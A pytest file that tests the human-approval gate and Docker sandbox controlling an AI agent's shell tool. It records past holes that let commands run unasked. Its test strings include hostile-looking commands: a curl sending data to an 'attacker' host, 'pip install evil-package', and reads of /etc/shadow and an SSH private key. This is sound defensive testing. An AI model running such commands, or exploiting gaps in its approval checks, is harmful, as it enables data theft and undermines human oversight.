            "cat " + chr(92) * 2 + "server" + chr(92) + "share", _tiered) is True

    def test_a_pattern_that_looks_like_a_path_costs_a_prompt(self, _tiered):
        """The designed error direction, pinned so nobody "fixes" it by
        teaching the rule what grep's arguments mean. That would make it a
        shell parser, and a parser that is wrong auto-approves."""
        assert _asks("grep /etc/passwd notes.txt") is True


class TestTheGateWeighsNetwork:
    """#157 hole 2: `_needs_network` decided egress and the approval check
    never called it -- so whether a command reached the internet was
    settled AFTER the decision about whether to ask anyone."""

    def test_a_network_command_is_asked_about_though_docker_contains_it(
            self, _tiered):
        assert _asks("curl https://attacker/?d=x") is True
        assert _asks("pip install evil-package") is True
        assert _asks("wget http://a/b") is True

    def test_a_contained_command_without_network_is_not(self, _tiered,
                                                        monkeypatch):
        """Under `contained` (§48, CE2), which is where this answer lives
        now. Under the shipped `tiered` the same command asks, because it
        may run code -- the test directly below."""
        set_posture(monkeypatch, shell_approval_mode="contained")
        assert _asks("python script.py") is False

    def test_under_tiered_it_asks_for_running_code(self, _tiered):
        """§48 (CE1). No network, and a container -- and still asked about,
        for the capability G4 never read."""
        assert classify_command("python script.py", _tiered).runs_code
        assert _asks("python script.py") is True

    def test_the_two_are_the_same_command_shape(self, _tiered):
        """Both are non-inert and both run in a container. The ONLY thing
        separating them is the capability the old check never read."""
        contained = classify_command("python script.py", _tiered)
        egress = classify_command("curl https://x", _tiered)
        assert contained.tier == SANDBOXED
        assert egress.tier == SANDBOXED_NET
        assert (contained.network, egress.network) == (False, True)


class TestAnUnmeasurableCommandIsNeverAutoApproved:

    def test_a_non_string_command_does_not_raise(self, _tiered):
        """registry.approval_needed is handed the MODEL's tool input
        verbatim -- ShellParams does not validate it until run(), which is
        after approval. Before §28 this was unreachable only because
        ToolApprovals.shell defaulted True and returned first."""
        profile = classify_command(["ls"], _tiered)
        assert profile.measured is False
        assert _asks(["ls"]) is True

    def test_an_empty_command_is_unmeasured(self, _tiered):
        assert classify_command("", _tiered).measured is False
        assert classify_command("   ", _tiered).measured is False
        assert _asks("") is True

    def test_containment_cannot_argue_an_unmeasured_call_through(self):
        """The vacuity guard. A profile that knows nothing answers False
        to every capability question, so without `measured` the CONTAINED
        branch approves it for having no network."""
        blank = CommandProfile(tier=UNKNOWN, measured=False,
                               escapes_workspace=False, writes=False,
                               runs_code=False, network=False, reason="")
        assert auto_approved(blank, CONTAINED) is False
        assert auto_approved(blank, UNCONTAINED) is False


class TestTheModeIsTheGateAndTheFieldIsTheRatchet:

    EVERY_SHAPE = ["ls -la", "cat /etc/shadow", "python x.py",
                   "curl https://x"]

    @pytest.mark.parametrize("command", EVERY_SHAPE)
    def test_always_asks_about_everything(self, _tiered, monkeypatch, command):
        set_posture(monkeypatch, shell_approval_mode="always")
        assert _asks(command) is True

    @pytest.mark.parametrize("command", EVERY_SHAPE)
    def test_never_asks_about_nothing(self, _tiered, monkeypatch, command):
        """"never" is the pre-§28 loose config, preserved deliberately.
        The fix for #157 is not that this became unreachable -- it is that
        reaching it now means writing the word "never"."""
        set_posture(monkeypatch, shell_approval_mode="never")
        assert _asks(command) is False

    def test_tiered_sits_between_them(self, _tiered):
        assert (_asks("ls -la"), _asks("cat /etc/shadow")) == (False, True)

    def test_no_approvals_field_can_force_shell_approval(self, _tiered,
                                                         monkeypatch):
        """The ratchet is gone, not defaulted off. A stale stub built the
        old way -- a `ToolApprovals` carrying `shell = True` -- must not
        resurrect it: `requires_approval` falls through to the dynamic
        default and the mode alone decides. `never` plus the stub still
        asks about nothing."""
        set_posture(monkeypatch, shell_approval_mode="never")
        monkeypatch.setattr(config, "ToolApprovals",
                            lambda: type("A", (), {"shell": True})())
        assert _asks("cat /etc/shadow") is False
        assert _asks("ls -la") is False

    def test_a_bogus_mode_raises_rather_than_defaulting(self, _tiered,
                                                        monkeypatch):
        """Neither direction of a silent default is safe: one asks about
        everything, the other about nothing, and a typo cannot pick."""
        set_posture(monkeypatch, shell_approval_mode="teired")
        with pytest.raises(ValueError, match="must be one of"):
            _asks("ls -la")

    def test_validate_mode_names_the_setting_it_rejected(self):
        with pytest.raises(ValueError, match="SHELL_APPROVAL_MODE"):
            validate_mode("nope", "config.SHELL_APPROVAL_MODE")

    def test_the_shipped_default_is_tiered(self):
        """Stated rather than left to an incidental pin. The mutation pass
        found this value WAS already pinned -- by a §7 fallback test that
        happens not to set the mode -- which is coverage by accident, and
        would move the moment that test set it explicitly."""
        import importlib
        fresh = importlib.import_module("config")
        assert fresh.SHELL_APPROVAL_MODE == "tiered"
        # The legal set is asserted where validate_mode() reads it. config
        # used to carry a second copy that nothing enforced, so this line
        # could have passed against a tuple the gate never consulted.
        from security.capability import APPROVAL_MODES
        assert APPROVAL_MODES == ("always", "tiered", "contained", "never")
        assert fresh.SHELL_APPROVAL_MODE in APPROVAL_MODES

    def test_shell_has_no_approvals_field_only_a_mode(self):
        """`tool_approvals` deliberately has no `shell` key: shell approval
        is governed solely by `shell_approval_mode`, so there is no second
        switch that can disagree with it. `tool_permissions.shell` stays --
        the D14 floor still needs somewhere to live."""
        assert not hasattr(config.ToolApprovals(), "shell")
        assert config.ToolPermissions().shell is False


class TestTheFallbackFlagsStillMeanWhatTheyMeant:
    """§28 replaced the ladder; it must not have quietly dropped the two
    rungs that were actually reachable."""

    def test_fallback_without_auto_approve_still_asks(self, _tiered,
                                                      monkeypatch):
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=False)
        assert _asks("python x.py", docker=False) is True

    def test_fallback_with_auto_approve_does_not(self, _tiered, monkeypatch):
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=True)
        assert _asks("python x.py", docker=False) is False

    def test_no_backend_at_all_does_not_ask(self, _tiered, monkeypatch):
        """Not "approved" -- run_sandboxed still raises SandboxUnavailable.
        Asking first spends a human decision on an outcome already fixed,
        which is the burn-a-turn class."""
        set_posture(monkeypatch, allow_insecure_fallback=False)
        assert _asks("python x.py", docker=False) is False
        assert containment_for(classify_command("python x.py", _tiered),
                               docker_available=False) == UNAVAILABLE


# ===========================================================================
# ---- Batch 92: code in the sandbox (§48) ----------------------------------
# ===========================================================================

# Every one of these answered False through the real gate with Docker up
# before §48. Deliberately NOT all interpreters: the point of the list is
# that the fix names none of them.
_CODE_SHAPES = [
    'python -c "print(1)"',
    "python3 -c pass",
    'bash -c "echo hi"',
    "sh run.sh",
    "./run.sh",
    "python run.py",
    "node run.js",
    "perl -e 1",
    '"python" run.py',
    "python3.13 run.py",
    "echo print(1) | python",
    "find . -exec cat {} ;",
    "pytest",
    "make",
    "rm -rf data",
    "ls -la && cat notes.txt",
]


class TestCodeInTheSandboxAsksUnderTiered:
    """§48 (CE1), amending G4. G4 approved any contained command without
    network, which is every way of running code there is: an interpreter's
    `-c`, a script the auto-approved `write` tool has just made, a test
    runner's conftest.py, a Makefile."""

    @pytest.mark.parametrize("command", _CODE_SHAPES)
    def test_it_asks_with_docker_up(self, command, _tiered):
        profile = classify_command(command, _tiered)
        assert profile.runs_code is True
        assert profile.network is False
        assert containment_for(profile, docker_available=True) == CONTAINED
        assert _asks(command, docker=True) is True

    @pytest.mark.parametrize("command", ["ls", "ls -la", "cat notes.txt",
                                         "grep pip notes.txt",
                                         "wc -l notes.txt"])
    def test_a_read_only_command_still_does_not(self, command, _tiered):
        profile = classify_command(command, _tiered)
        assert (profile.tier, profile.runs_code) == (INERT, False)
        assert _asks(command, docker=True) is False

    @pytest.mark.parametrize("command", [
        "cat .ven*/settings.json; true",
        "python -c \"print(open('.venastine/settings.json').read())\"",
    ])
    def test_code_reading_a_protected_segment_is_asked_about(self, command,
                                                            _tiered):
        """The leak §48 measured. The token check cannot see either
        spelling -- a glob in one, a string inside a program in the other
        -- and both ran unasked while SECURITY.md, protected_paths.py and
        `_command_touches_protected` said such a spelling met a human.
        The first assertion is what makes the second one about CE1 rather
        than about the token check."""
        from tools.builtin.shell import _command_touches_protected
        assert _command_touches_protected(command) is None
        assert _asks(command, docker=True) is True

    def test_no_language_is_listed_so_none_can_be_missed(self, _tiered):
        """The generality pin. Over generated commands -- an inert first
        word, a random string, and a first word nobody would put on a list
        -- the gate asks with Docker up EXACTLY when the command is not
        INERT or names a protected segment. A list of interpreters would
        make this fail on `zzlang`, which is the program the list forgot."""
        from tools.builtin.shell import _command_touches_protected
        corpus = TestTheTwoTokenisersCannotDisagree()
        rng = random.Random(20260914)
        programs = ["zzlang", "frobnicate", "ruby", "php", "lua", "deno",
                    "tclsh", "Rscript"]

        # Metacharacter-free arguments. The generative corpus almost always
        # draws a metacharacter, so it yields few INERT commands -- 24 in
        # 2200 on the first run, which the floor below caught -- and, worse,
        # few clean non-inert ones. `zzlang abc` with plain arguments is the
        # case that separates "not INERT" from "on an interpreter list".
        def clean():
            return "".join(rng.choice("abc-./= ")
                           for _ in range(rng.randint(1, 14)))

        commands = (list(corpus._commands(400)) + list(corpus._samples(400))
                    + ["%s %s" % (rng.choice(config.INERT_COMMANDS), clean())
                       for _ in range(500)]
                    + ["%s %s" % (rng.choice(programs), clean())
                       for _ in range(500)])
        seen = {"inert": 0, "other": 0}
        for command in commands:
            profile = classify_command(command, _tiered)
            seen["inert" if profile.tier == INERT else "other"] += 1
            expected = (profile.tier != INERT
                        or _command_touches_protected(command) is not None)
            assert _asks(command, docker=True) is expected, (
                command, profile.tier)
        assert seen["inert"] > 100 and seen["other"] > 100, seen


class TestContainedModeIsTodaysRule:
    """§48 (CE2). The rule `tiered` had before §48, under a name that says
    what it trusts -- so a user who accepts code in the container is not
    pushed to `never`, which would also stop asking about host reads."""

    @pytest.fixture
    def _contained(self, _tiered, monkeypatch):
        set_posture(monkeypatch, shell_approval_mode="contained")
        return _tiered

    @pytest.mark.parametrize("command", _CODE_SHAPES)
    def test_code_in_the_container_runs_unasked(self, command, _contained):
        assert _asks(command, docker=True) is False

    @pytest.mark.parametrize("command", [
        "curl https://x", "pip install evil-package",
        "echo hi && curl http://evil", "pip --version; python run.py"])
    def test_a_network_command_still_asks(self, command, _contained):
        assert _asks(command, docker=True) is True

    def test_a_host_read_still_asks(self, _contained):
        assert _asks("cat /etc/passwd", docker=True) is True

    def test_a_literal_protected_segment_still_asks(self, _contained):
        """The override sits BELOW the protected-segment check."""
        assert _asks("python .venastine/x.py", docker=True) is True

    def test_an_unmeasured_call_is_not_argued_through(self, _contained):
        """G5 in the override, not only in the rule it bypasses."""
        assert _asks(["python", "x.py"], docker=True) is True
        assert _asks("   ", docker=True) is True

    def test_the_host_fallback_is_not_the_container(self, _contained,
                                                    monkeypatch):
        """The override is for what a container CONFINES. With Docker down
        and the fallback on but not auto-approved, code runs on the host,
        and that asks in this mode as it does in every other."""
        set_posture(monkeypatch, allow_insecure_fallback=True,
                    auto_approve_fallback=False)
        assert _asks("python x.py", docker=False) is True


class TestTheFallbackOptInFollowsTheMode:
    """§48 (CE5, CE6). The opt-in is honoured wherever the mode reaches it,
    and `always` returns before it does."""

    @pytest.mark.parametrize("mode,asks", [
        ("always", True), ("tiered", False), ("contained", False),
        ("never", False)])
    def test_code_on_the_host_fallback(self, mode, asks, _tiered,
                                       monkeypatch):
        set_posture(monkeypatch, shell_approval_mode=mode,
                    allow_insecure_fallback=True, auto_approve_fallback=True)
        assert _asks("python x.py", docker=False) is asks

    @pytest.mark.parametrize("mode", ["always", "tiered", "contained",
                                      "never"])
    def test_the_badge_says_no_ask_exactly_when_the_gate_does_not_ask(
            self, mode, _tiered, monkeypatch):
        """UN3 held against the GATE rather than against the flags. The
        badge said "host shell, no ask" under `always`, measured, while the
        gate asked about every command."""
        from security import posture
        set_posture(monkeypatch, shell_approval_mode=mode,
                    allow_insecure_fallback=True, auto_approve_fallback=True)
        labels = [label for label, _ in posture.current().unsafe_reasons()]
        assert ("host shell, no ask" in labels) is (
            not _asks("python x.py", docker=False))


class TestRunsCodeIsItsOwnDimension:
    """§48 (CE7). G1: a missing dimension is a missing field."""

    def test_every_producer_states_it(self, _tiered):
        assert classify_command("ls", _tiered).runs_code is False
        assert classify_command("cat /etc/passwd", _tiered).runs_code is False
        assert classify_command("python x.py", _tiered).runs_code is True
        assert classify_command("curl https://x", _tiered).runs_code is True
        assert classify_command("", _tiered).runs_code is True
        assert classify_command(["ls"], _tiered).runs_code is True

    def test_it_alone_decides_a_contained_answer(self):
        """`writes` False throughout, so a rule that read `writes` instead
        -- or dropped `runs_code` from either branch -- answers wrongly."""
        import dataclasses
        base = CommandProfile(tier=SANDBOXED, measured=True,
                              escapes_workspace=False, writes=False,
                              runs_code=False, network=False, reason="")
        code = dataclasses.replace(base, runs_code=True)
        assert auto_approved(base, CONTAINED) is True
        assert auto_approved(code, CONTAINED) is False
        assert auto_approved(base, UNCONTAINED) is True
        assert auto_approved(code, UNCONTAINED) is False

    def test_it_is_required(self):
        """No default, so a second producer cannot leave it unsaid."""
        with pytest.raises(TypeError):
            CommandProfile(tier=INERT, measured=True, escapes_workspace=False,
                           writes=False, network=False, reason="")

    def test_a_host_read_never_probes_docker(self, _tiered):
        """An ordering the pre-§28 ladder had: its inert step returned
        before its Docker step, so a light-path command never paid for a
        `docker info` that costs up to its 10s timeout against a wedged
        daemon.

        HOST_READ keeps it, and keeps it for a REASON rather than as an
        optimisation: it names a file outside the workspace, so no
        container could show it and the probe's answer cannot change the
        containment. INERT lost it in §46 (EP5) -- it runs in the
        container now, so its containment genuinely depends on whether
        there is one. The cost is bounded by `is_docker_available` being
        lru_cached for the process, not by skipping the call.
        """
        with patch("tools.builtin.shell.is_docker_available") as probe:
            _shell_approval_check("shell", {"command": "cat /etc/shadow"})
        probe.assert_not_called()

    def test_an_inert_command_now_asks_docker_where_it_will_run(self,
                                                                _tiered):
        """EP5's cost, stated so it is a decision rather than a drift."""
        with patch("tools.builtin.shell.is_docker_available") as probe:
            probe.return_value = True
            _shell_approval_check("shell", {"command": "ls -la"})
        probe.assert_called()


class TestOneClassificationTwoConsumers:

    def test_the_gate_and_the_executor_read_the_same_object(self, _tiered):
        """#157's shape: `_is_inert` was consulted by the approval check
        and again by the router, for two different questions, and neither
        ever saw the other's answer."""
        profile = classify_command("pip install x", _tiered)
        with patch("security.sandbox._run_docker") as docker:
            docker.return_value = {"stdout": "", "stderr": "",
                                   "return_code": 0}
            run_sandboxed("pip install x", _tiered, docker_available=True,
                          profile=profile)
        assert docker.call_args[0][3] is profile.network is True

    def test_run_threads_its_profile_into_the_sandbox(self, _tiered):
        from tools.builtin import shell as shell_mod
        with patch("tools.builtin.shell.is_docker_available",
                   return_value=True), \
             patch("tools.builtin.shell.run_sandboxed") as sandboxed:
            sandboxed.return_value = {"stdout": "", "stderr": "",
                                      "return_code": 0}
            shell_mod.run({"command": "curl https://x"})
        passed = sandboxed.call_args[1]["profile"]
        assert passed.tier == SANDBOXED_NET and passed.network is True

    def test_the_router_sends_a_host_read_down_the_inert_path(self, _tiered):
        """An APPROVED host read must still read the host. `read` outside
        the workspace asks and then reads the real file; routing an
        approved `cat /etc/passwd` into a container would answer a
        different question than the one that was consented to."""
        with patch("security.sandbox._run_inert") as inert:
            inert.return_value = {"stdout": "", "stderr": "",
                                  "return_code": 0}
            run_sandboxed("cat /etc/shadow", _tiered, docker_available=True)
        inert.assert_called_once()


class TestTheApprovalNoticeSaysWhereItRuns:

    def test_it_names_the_host_for_an_inert_read(self, _tiered):
        notice = _shell_approval_notice({"command": "cat /etc/shadow"})
        assert "HOST_READ" in notice and "HOST" in notice

    def test_it_names_the_container_for_a_sandboxed_command(self, _tiered):
        with patch("tools.builtin.shell.is_docker_available",
                   return_value=True):
            notice = _shell_approval_notice({"command": "curl https://x"})
        assert "SANDBOXED_NET" in notice and "Docker" in notice

    def test_the_registry_wires_it_up(self):
        from tools.registry import registry
        assert registry._tools["shell"].approval_notice is not None


class TestTheVenastineMount:

    def test_nothing_is_mounted_when_venastine_is_not_in_the_workspace(
            self, tmp_path):
        """The DEFAULT layout: `.venastine/` resolves from the project
        path while the sandbox mounts AGENT_WORKSPACE (`./workspace`), so
        the two are siblings and Docker cannot reach it at all."""
        assert _venastine_readonly_mount(str(tmp_path)) == []

    def test_nothing_is_mounted_when_the_directory_does_not_exist(
            self, tmp_path):
        """The isdir half. Docker CREATES a missing bind source, as a
        root-owned directory on the host -- and is_trusted() returns True
        while `.venastine/` is absent but False once it exists with no
        store entry, so an unconditional mount would conjure a directory
        and then make the harness prompt the user to trust it."""
        assert not (tmp_path / ".venastine").exists()
        assert _venastine_readonly_mount(str(tmp_path)) == []
        assert not (tmp_path / ".venastine").exists()

    def test_it_is_mounted_read_only_when_it_is_really_there(self, tmp_path):
        (tmp_path / ".venastine").mkdir()
        args = _venastine_readonly_mount(str(tmp_path))
        assert args[0] == "-v"
        assert args[1].endswith(":/workspace/.venastine:ro")

    def test_docker_gets_the_workspace_writable_and_the_subtree_read_only(
            self, tmp_path):
        """/workspace stays writable so builds still work; only the
        subtree is read-only, which Docker resolves by mount depth."""
        (tmp_path / ".venastine").mkdir()
        with patch("security.sandbox.subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            _run_docker("ls", str(tmp_path))
        argv = popen.call_args[0][0]
        mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "-v"]
        assert any(m.endswith(":/workspace") for m in mounts)
        assert any(m.endswith(":/workspace/.venastine:ro") for m in mounts)

    def test_a_symlinked_venastine_pointing_out_of_the_workspace_is_refused(
            self, tmp_path):
        """What the `nested` half is actually for, found by a surviving
        mutant: os.path.join always produces a nested path, so deleting
        that guard changed nothing any other test could see -- until you
        remember realpath resolves symlinks.

        A `.venastine` symlinked at /etc would otherwise be bind-mounted
        into the container at /workspace/.venastine. Read-only, so it
        could not be modified, but it would put a directory the workspace
        does not contain in front of a model that reads files. This is
        the same escape §14 already found in the trust hash."""
        workspace = tmp_path / "ws"
        outside = tmp_path / "elsewhere"
        workspace.mkdir()
        outside.mkdir()
        try:
            (workspace / ".venastine").symlink_to(
                outside, target_is_directory=True)
        except (OSError, NotImplementedError):    # pragma: no cover
            pytest.skip("platform does not support directory symlinks")
        assert _venastine_readonly_mount(str(workspace)) == []


class TestTheWorkspaceIsCreated:
    """Audit #50."""

    def test_run_sandboxed_creates_a_missing_workspace(self, tmp_path):
        workspace = tmp_path / "does-not-exist-yet"
        assert not workspace.exists()
        with patch("security.sandbox._run_inert") as inert:
            inert.return_value = {"stdout": "", "stderr": "",
                                  "return_code": 0}
            run_sandboxed("ls", str(workspace))
        assert workspace.is_dir()

    def test_a_bad_cwd_is_a_result_not_an_escaping_exception(self, tmp_path):
        """#50's other half, found writing this test. A missing CWD is
        FileNotFoundError on POSIX -- which the handler caught, and then
        misreported as "Command not found" -- but NotADirectoryError on
        Windows, which is an OSError and NOT a FileNotFoundError, so it
        escaped the handler completely.

        `ls` exists and the directory does not, in both backends."""
        missing = str(tmp_path / "nope")
        for result in (_run_inert("ls", missing),
                       _run_subprocess_fallback("ls", missing, "bash")):
            assert result["return_code"] == -1
            assert isinstance(result["stderr"], str) and result["stderr"]


class TestTheResultSaysWhereItRan:
    """ROADMAP_v2 §46 (EP4).

    The gate has told the HUMAN where a command runs since §28 --
    `_shell_approval_notice` says "Runs on the HOST, with your own file
    access" in as many words. It told the MODEL nothing: `run_sandboxed`
    returned stdout, stderr and a return code, so a host read and a
    contained run were indistinguishable to the party that then writes
    the user an answer about the output.

    What that cost, in a real session: an agent asked which filesystem
    it was on ran `pwd && ls -la` (metacharacters, so the container) and
    then `cat /proc/self/mountinfo` (inert, argument outside the
    workspace, so the host). On Windows `cat` resolves off the host
    PATH, which on that machine meant a third party's MSYS2 build, and
    MSYS2 synthesises /proc from its own mount table. The model read a
    Git installation's fstab, believed it was the container's, and told
    its user the sandbox was rooted in another product's directory with
    the whole C: drive bind-mounted in. Every alarming sentence was
    false and nothing it had been given could have said so.
    """

    @pytest.fixture
    def ws(self, tmp_path):
        return str(tmp_path)

    def test_a_contained_run_says_container(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox._run_docker") as docker, \
             patch("security.sandbox._log_image_identity"):
            docker.return_value = {"stdout": "", "stderr": "",
                                   "return_code": 0}
            result = run_sandboxed("python x.py", ws, docker_available=True)
        assert result["ran_on"] == "container"
        assert result["tier"] == SANDBOXED

    def test_a_host_read_says_host_and_names_the_tier(self, monkeypatch, ws):
        """Two fields, not one. "host" alone under-explains: HOST_READ on
        the host is the design working, while INERT on the host means
        Docker was down."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["cat"])
        with patch("security.sandbox._run_inert") as inert:
            inert.return_value = {"stdout": "root:x:0:0", "stderr": "",
                                  "return_code": 0}
            result = run_sandboxed("cat /etc/passwd", ws,
                                   docker_available=True)
        assert result["ran_on"] == "host"
        assert result["tier"] == HOST_READ

    def test_the_insecure_fallback_says_host_too(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        set_posture(monkeypatch, allow_insecure_fallback=True)
        with patch("security.sandbox._run_subprocess_fallback") as fallback:
            fallback.return_value = {"stdout": "", "stderr": "",
                                     "return_code": 0}
            result = run_sandboxed("python x.py", ws, docker_available=False)
        assert result["ran_on"] == "host"

    def test_every_backend_annotates(self, monkeypatch, ws):
        """A route added later that forgets to say where it ran is the
        defect this class exists for, so the assertion is over ROUTES
        rather than over the three spelled out above."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        set_posture(monkeypatch, allow_insecure_fallback=True)
        blank = {"stdout": "", "stderr": "", "return_code": 0}
        routes = [
            ("ls -la", True), ("ls -la", False),
            ("cat /etc/passwd", True), ("cat /etc/passwd", False),
            ("python x.py", True), ("python x.py", False),
        ]
        for command, docker in routes:
            with patch("security.sandbox._run_docker", return_value=dict(blank)), \
                 patch("security.sandbox._run_inert", return_value=dict(blank)), \
                 patch("security.sandbox._run_subprocess_fallback",
                       return_value=dict(blank)), \
                 patch("security.sandbox._log_image_identity"):
                result = run_sandboxed(command, ws, docker_available=docker)
            assert result.get("ran_on") in ("host", "container"), (
                f"{command!r} with docker={docker} came back without "
                "saying where it ran")
            assert result.get("tier"), command

    def test_the_schema_tells_the_model_the_rule_before_it_calls(self):
        """A result field is after the fact. The model also has to be
        able to AVOID the mistake, which means the schema has to say
        that an argument outside the workspace leaves the sandbox."""
        from tools.builtin.shell import TOOL_SCHEMA
        text = (TOOL_SCHEMA["description"] + " " + TOOL_SCHEMA[
            "input_schema"]["properties"]["command"]["description"]).lower()
        assert "host" in text
        assert "outside the workspace" in text
        assert "ran_on" in text

    def test_the_notice_names_the_binary_a_host_read_will_execute(self,
                                                                  _tiered):
        """§46 (EP8). "Runs on the host" understates it on Windows,
        where ls/cat/grep have no native binary and the inert path takes
        whatever is first on PATH -- on the machine where this was
        found, another product's bundled cat.exe."""
        import shutil as _shutil
        with patch.object(_shutil, "which",
                          return_value=r"C:\other\product\cat.exe"):
            notice = _shell_approval_notice({"command": "cat /etc/passwd"})
        assert r"C:\other\product\cat.exe" in notice
        assert "HOST" in notice

    def test_the_notice_says_nothing_about_a_binary_it_cannot_resolve(
            self, _tiered):
        import shutil as _shutil
        with patch.object(_shutil, "which", return_value=None):
            notice = _shell_approval_notice({"command": "cat /etc/passwd"})
        assert "resolves to" not in notice

    def test_resolving_the_binary_is_total(self, _tiered):
        """Same requirement classify_command has, one layer down: this
        runs inside registry.approval_needed(), which is handed the
        model's tool input verbatim, and shutil.which raises on a
        non-string."""
        for command in ([], {"a": 1}, None, 42, "", "   "):
            assert isinstance(_shell_approval_notice({"command": command}),
                              str)


class TestOurContainersAreIdentifiable:
    """ROADMAP_v2 §46 (EP7).

    Not the cause of anything yet, and recorded as such. But
    SANDBOX_DOCKER_IMAGE is a TAG, and a tag is not an identity:
    anything on the machine can build or pull a different image under
    the same name and this harness would run inside it silently. The
    label answers the other half -- `docker ps` could not previously
    tell a container of ours from any other tool's, since the name is a
    bare uuid.
    """

    def test_the_container_carries_our_label(self):
        with patch("security.sandbox.subprocess.Popen") as popen:
            proc = MagicMock()
            proc.communicate.return_value = ("", "")
            proc.returncode = 0
            popen.return_value = proc
            _run_docker("ls", "/tmp/ws")
        args = popen.call_args[0][0]
        assert "--label" in args
        assert args[args.index("--label") + 1] == "venastine.sandbox=1"

    def test_the_resolved_image_id_is_logged_once(self, caplog):
        import security.sandbox as sandbox
        sandbox._log_image_identity._said = False
        sandbox._resolved_image_id.cache_clear()
        with patch("security.sandbox.subprocess.run") as run:
            run.return_value = MagicMock(returncode=0,
                                         stdout="sha256:abc123\n")
            with caplog.at_level("INFO", logger="security.sandbox"):
                sandbox._log_image_identity()
                sandbox._log_image_identity()
        sandbox._log_image_identity._said = False
        sandbox._resolved_image_id.cache_clear()
        said = [r for r in caplog.records if "resolves to" in r.message]
        assert len(said) == 1, "the image line is per-process, not per-run"
        assert "sha256:abc123" in said[0].getMessage()

    def test_an_unresolvable_image_does_not_stop_a_run(self):
        """Diagnostic, so a failure here must not fail a run Docker
        itself is about to accept."""
        import security.sandbox as sandbox
        sandbox._resolved_image_id.cache_clear()
        with patch("security.sandbox.subprocess.run",
                   side_effect=FileNotFoundError):
            assert sandbox._resolved_image_id("python:3.13-slim") == ""
        sandbox._resolved_image_id.cache_clear()


class TestTheTierVocabularyStaysCoherent:

    def test_inert_and_network_command_lists_are_disjoint(self):
        """A tier is ambiguous if a command is in both lists. They are
        disjoint today, and nothing would notice if a later edit added
        `curl` to the inert list -- at which point it runs on the HOST."""
        assert not (set(config.INERT_COMMANDS)
                    & set(config.NETWORK_ALLOWED_COMMANDS))

    def test_every_tier_is_reachable(self, tmp_path):
        seen = {classify_command(c, str(tmp_path)).tier for c in (
            "ls", "cat /etc/shadow", "python x.py", "curl https://x", "")}
        assert seen == {INERT, HOST_READ, SANDBOXED, SANDBOXED_NET, UNKNOWN}

    def test_a_host_read_is_uncontained_however_healthy_docker_is(
            self, tmp_path):
        """Naming a tier "inert" never made it contained, and #157 was
        reading it as though it did.

        HOST_READ is the half of that which cannot be fixed by routing:
        its defining property is an argument outside the workspace, so
        the container has nothing to show it and UNCONTAINED is the
        truth rather than a shortfall.
        """
        profile = classify_command("cat /etc/shadow", str(tmp_path))
        assert containment_for(profile, docker_available=True) == UNCONTAINED
        assert containment_for(profile, docker_available=False) == UNCONTAINED

    def test_an_inert_command_is_contained_when_there_is_a_container(
            self, tmp_path):
        """§46 (EP5). Every argument is inside the workspace and the
        workspace is what the container mounts, so the tier the gate
        auto-approves is the tier that can run in a pinned image."""
        profile = classify_command("ls -la", str(tmp_path))
        assert containment_for(profile, docker_available=True) == CONTAINED
        assert containment_for(profile, docker_available=False) == UNCONTAINED

    def test_moving_inert_into_the_container_did_not_move_the_gate(
            self, tmp_path):
        """The approval answer must be identical under either
        containment, or EP5 would have quietly changed what gets asked
        about as a side effect of changing where things run.

        It holds because an INERT profile has escapes_workspace and
        writes False by construction, and because INERT_COMMANDS and
        NETWORK_ALLOWED_COMMANDS are disjoint -- which the test above
        pins, and which is what makes `not network` and
        `not (escapes or writes or network)` the same answer here.
        """
        for command in ("ls -la", "cat notes.txt", "grep x notes.txt"):
            profile = classify_command(command, str(tmp_path))
            assert (auto_approved(profile, CONTAINED)
                    is auto_approved(profile, UNCONTAINED)), command


class TestShellApprovalModeIsRejectedBySettingsJson:
    """ROADMAP_v2 §28 (G7). R12's rule applied to a third kind of key."""

    @staticmethod
    def _validate(data):
        from core.config_loader import _validate_settings
        _validate_settings(data, "test-settings.json")

    def test_it_is_rejected_by_name_not_as_an_unknown_key(self):
        """The message matters as much as the rejection. The generic
        "unknown key" branch reads as an oversight someone should fix by
        adding support -- and supporting it would let a project's
        settings.json, which beats the user's (D29), set "never" and turn
        `cat ~/.aws/credentials` into an unprompted host read.

        D17's trust prompt is not a substitute: the same prompt covers a
        README-shaped CONTEXT.md, and nobody reading it is deciding about
        their shell gate."""
        with pytest.raises(ValueError) as exc:
            self._validate({"shell_approval_mode": "never"})
        message = str(exc.value)
        assert "deliberately not supported" in message
        # Where the gate DOES live -- name and file together, so the message
        # cannot keep pointing at a file the value has left.
        assert "shell_approval_mode in config.yaml" in message
        assert "unknown key" not in message

    def test_every_value_is_rejected_the_same_way(self):
        """Including the ones that would TIGHTEN. The key is refused
        because of where it can come from, not because of what it says --
        accepting "always" from a project would make the absence of the
        key the only thing standing between a repo and setting it."""
        for value in ("never", "tiered", "always", "nonsense"):
            with pytest.raises(ValueError, match="deliberately not"):
                self._validate({"shell_approval_mode": value})

    def test_a_near_miss_still_gets_the_generic_message(self):
        """The by-name branch must not swallow the ordinary typo case."""
        with pytest.raises(ValueError, match="unknown key"):
            self._validate({"shell_approval_mod": "never"})
# ===========================================================================
# ---- Batch 37: quoting, and what the workspace may point at ---------------
# ===========================================================================


class TestQuotingCannotHideAnEscape:
    """This module tokenises a command TWICE, in two different ways.

    `_escapes_workspace` reads raw `.split()` tokens; `_run_inert` execs
    `shlex.split()` tokens, and shlex STRIPS quotes. While quotes were
    accepted, `cat "/etc/passwd"` was ONE token that joined onto the
    workspace root and read as inside it -- classified INERT, silently
    auto-approved, no prompt -- and then ran on the host as
    `['cat', '/etc/passwd']`. #157 again, arriving through the gap between
    two tokenisers rather than through the gate.
    """

    QUOTED_ESCAPES = [
        'cat "/etc/passwd"',
        "cat '/etc/passwd'",
        'cat "../../../etc/passwd"',
        'grep --file="/etc/passwd" notes.txt',
        'stat "/root/.ssh/id_rsa"',
    ]

    @pytest.mark.parametrize("command", QUOTED_ESCAPES)
    def test_a_quoted_escape_is_no_longer_inert(self, command, _tiered):
        assert _is_inert(command) is False
